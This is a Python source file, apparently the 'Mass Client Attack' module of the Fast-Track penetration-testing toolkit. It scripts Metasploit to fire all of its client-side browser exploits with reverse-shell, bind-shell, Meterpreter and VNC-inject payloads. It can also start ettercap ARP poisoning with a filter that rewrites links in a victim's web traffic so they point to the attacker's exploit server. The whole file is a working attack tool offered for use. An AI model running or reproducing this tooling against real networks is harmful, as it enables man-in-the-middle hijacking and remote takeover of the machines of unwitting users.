#!/usr/bin/env python

import pexpect
import sys
import os
import subprocess
import re
#from bin.include import print_banner

try:
    import psyco
    psyco.full()
except ImportError:
    pass

basepath = os.getcwd()

#def show_massclient(basepath):

# define metasploit path
meta_path=file("%s/bin/config/config" % (basepath),"r").readlines()
for line in meta_path:
        line=line.rstrip()
        match=re.search("METASPLOIT_PATH",line)
        if match:
           line=line.replace("METASPLOIT_PATH=","")
           metapath=line
    
try:
        #define IP Addr to echo into index.html
        try:
           ipaddr=sys.argv[3]
        except IndexError:
           #print_banner()
           print """
        Mass Client Client Attack
    
        Requirements: PExpect
    
        Metasploit has a bunch of powerful client-side attacks available in
        its arsenal. This simply launches all client side attacks within
        Metasploit through msfcli and starts them on various ports
        and starts a custom HTTP server for you, injects a new index.html 
        file, and puts all of the exploits in iframes. 
    
        If you can get someone to connect to this web page, it will basically 
        brute force various client side exploits in the hope one succeeds. 
        You'll have to monitor each shell if one succeeds.. Once finished,
        just have someone connect to port 80 for you and if they are vulnerable
        to any of the exploits...should have a nice shell.
        
        <ctrl>-c to Cancel
                     """
           ipaddr=raw_input("    Enter the IP Address to listen on: ")
        # set flags to 0 in case nothing was specified for sys.argv5 and 6
        etterchoice=0
        ettercapon=0
        try:
           # this is the payload specification for metasploit payloads
           choice=sys.argv[4]
        # if its not specified or from menu mode, raise exception and print payloads
        except IndexError:
           print """
        Specify your payload:
    
        1. Windows Meterpreter Reverse Meterpreter
        2. Generic Bind Shell
        3. Windows VNC Inject Reverse_TCP (aka "Da Gui")
        4. Reverse TCP Shell
    """
           choice=raw_input("    Enter the number of the payload you want: ")
        if choice == '1':
           choice=("windows/meterpreter/reverse_tcp\nset LHOST %s" % (ipaddr))
        if choice == '2':
           choice=("generic/shell_bind_tcp")
        if choice == '3':
           choice=("windows/vncinject/reverse_tcp\nset LHOST %s" % (ipaddr))
        if choice == '4':
           choice=("generic/shell_reverse_tcp\nset LHOST %s" % (ipaddr))
        try:
           # if no option specified or in menu mode throw error and ask if ettercap wants to be used
           ettercapon=sys.argv[5]
        except IndexError:
           etterchoice=raw_input("""\n    Would you like to use ettercap to ARP poison a host yes or no: """)
        if etterchoice == 'yes':
           try:
              # if no option specified and user specified yes, start the ettercap process
              ettercap=sys.argv[6]
           except IndexError:
              print """
        Ettercap allows you to ARP poison a specific host and when they browse
        a site, force them to use the metasploit site and launch a slew of
        exploits from the Metasploit repository. ETTERCAP REQUIRED. \n\n """
              ettercap=raw_input("    What IP Address do you want to poison: ")
           print "    Setting up the ettercap filters...."
           filewrite=file("bin/appdata/fasttrack.filter","w")        
           # custom filter for replacing all HREFs with mass client server
           filter=(r'''if (ip.proto == TCP && tcp.dst == 80) {
       if (search(DATA.data, "Accept-Encoding")) {
          replace("Accept-Encoding", "Accept-Rubbish!"); 
    	  # note: replacement string is same length as original string
          msg("Client Accepted our encoding!\n");
       }
    }
    if (ip.proto == TCP && tcp.src == 80) {
       replace("a href=", "a href=\"http://%s\" ");
       replace("a href=", "a href=\"http://%s\" ");
       msg("Filter Ran.\n");
    }
    ''' % (ipaddr,ipaddr))
           filewrite.write(filter)
           filewrite.close()
           print "    Filter created..."
           print "    Compiling Ettercap filter..."
           # convert the filter to ettercap format using etterfilter
           ettercompile=subprocess.Popen("etterfilter bin/appdata/fasttrack.filter -o bin/appdata/fasttrack.ef", shell=True).wait()  
           print "    Filter compiled...Running Ettercap and poisoning target..."
           # get ettercap started
           ettercaprun=subprocess.Popen("""xterm -geometry 50x30+3-3 -T "Fast-Track Ettercap Poison" -e "ettercap -T -q -F bin/appdata/fasttrack.ef -M ARP /%s/ //" 2> /dev/null""" % (ettercap), shell=True)     
        if ettercapon == '1':
           try:
              ettercap=sys.argv[6]
           except IndexError:
              print """
        Ettercap allows you to ARP poison a specific host and when they browse
        a site, force them to use the metasploit site and launch a slew of
        exploits from the Metasploit repository.\n\n """
              ettercap=raw_input("    What IP Address do you want to poison: ")
           print "    Setting up the ettercap filters...."
           filewrite=file("bin/appdata/fasttrack.filter","w")
           filter=(r'''if (ip.proto == TCP && tcp.dst == 80) {
       if (search(DATA.data, "Accept-Encoding")) {
          replace("Accept-Encoding", "Accept-Rubbish!"); 
    	  # note: replacement string is same length as original string
          msg("Client accepted our encoding!!!\n");
       }
    }
    if (ip.proto == TCP && tcp.src == 80) {
       replace("a href=", "a href=\"http://%s\" ");
       replace("a href=", "a href=\"http://%s\" ");
       msg("Hijacking HREF's in client browser...\n");
    }
    ''' % (ipaddr,ipaddr))
           filewrite.write(filter)
           filewrite.close()
           print "    Filter created..."
           print "    Compiling Ettercap filter..."
           ettercompile=subprocess.Popen("etterfilter bin/appdata/fasttrack.filter -o bin/appdata/fasttrack.ef", shell=True).wait()  
           print "    Filter compiled...Running Ettercap and poisoning target..."
           ettercaprun=subprocess.Popen("""xterm -geometry 75x25+5-90 -T "Fast-Track Ettercap Poison" -e "ettercap -T -q -F bin/appdata/fasttrack.ef -M ARP /%s/ //" 2> /dev/null""" % (ettercap), shell=True) 
        basepath=os.getcwd()
        print "    Setting up Metasploit MSFConsole with various exploits..."
        prepfile=file("metasploitloadfile","w")
        payload=("set PAYLOAD %s\n" % (choice))
        uri=("set URIPATH /\n")
        fileread=file("%s/bin/ftsrc/clientattack/exploits/list" % (basepath), "r").readlines()
        srvport=8000
        lport=9000
        for line in fileread:
          line=line.rstrip()
          a=line.split(" ")
          match=re.search("exploit",line)
          if match:
            line=a[4]
            match=re.search("aim",line)
            if not match:
               prepfile.write("use %s\n" % (line))
            prepfile.write(payload)
            prepfile.write("set SRVPORT %s\n" % (srvport))
            srvport=srvport+1
            prepfile.write(uri)
            prepfile.write("set LPORT %s\n" % (lport))
            lport=lport+1
            prepfile.write("exploit\n")
        prepfile.close()
        print "    If an exploit succeeds, type sessions -l to list shells and sessions -i <id>\nto interact...\n\n"
        print "    Have someone connect to you on port 80...\n"
        print "    Launching MSFConsole and Exploits...\n"
        print "    Once you see the Metasploit Console launch all the exploits have someone\n    connect to you.."
        launchsploit=subprocess.Popen("""xterm -geometry 100x50-1+1 -T "Fast-Track Mass Client Attack" -e "%smsfconsole -r %s/metasploitloadfile" 2> /dev/null""" % (metapath,basepath), shell=True) 
        launchhttpserver=subprocess.Popen("""xterm -geometry 75x25 -T "Fast-Track Custom HTTP Server" -e "python %s/bin/ftsrc/clientattack/httpserver.py %s" 2> /dev/null""" % (basepath,ipaddr), shell=True)   
        pause=raw_input("    Press enter to end the Mass Client Attack...")        

except KeyboardInterrupt:
           print "\n\n    Exiting Fast-Track Mass Client Attack...\n\n"
           delfile=os.popen3("del metasploitloadfile")

except Exception,e:
           print e
           print "\n\n    Exiting Fast-Track Mass Client Attack...\n\n"
           delfile=os.popen3("rm metasploitloadfile;rm bin/appdata/fasttrack.ef;rm bin/appdata/fasttrack.filter")

